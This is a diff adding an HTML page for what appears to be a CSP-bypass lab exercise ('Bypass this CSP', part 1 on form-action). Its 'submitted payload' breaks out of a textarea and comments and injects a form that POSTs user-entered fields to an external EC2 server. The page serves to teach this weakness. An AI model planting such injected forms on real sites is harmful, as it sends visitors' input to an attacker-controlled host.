@@ -1,0 +1,25 @@
+<html>
+<head>
+    <title>Part 1: CSP and <code>form-action</code></title>
+    <link rel="stylesheet" href="app.css" />
+</head>
+    <h1>Bypass this CSP</h1>
+    <a href="/">Go back</a> /
+    <a id="2" href="part-2.html">Go to Part-2</a>
+    <br/><br/>
+    <h3>Submitted payload</h3>
+    <div>Welcome! Please click on the Toggle button to get a quote</div>
+    <br/>
+    <!-- Surprise -->
+    <!-- </textarea> --><!-- '"´ -->
+	<form action= "http://ec2-34-208-198-108.us-west-2.compute.amazonaws.com:8080/Project1/return.html" method="POST" id="quote">
+		Author: <input type="text" name="Author" /> <br>
+		Name of Book: <input type="text" name= "Name_of_Book" /> <br>
+		<input type="submit" value ="Enter" />
+        <h3>Get a new quote!</h3>
+        <input type="submit" value="Toggle" />
+    <br/>
+	</form>
+        <div></div>
+</body>
+</html>
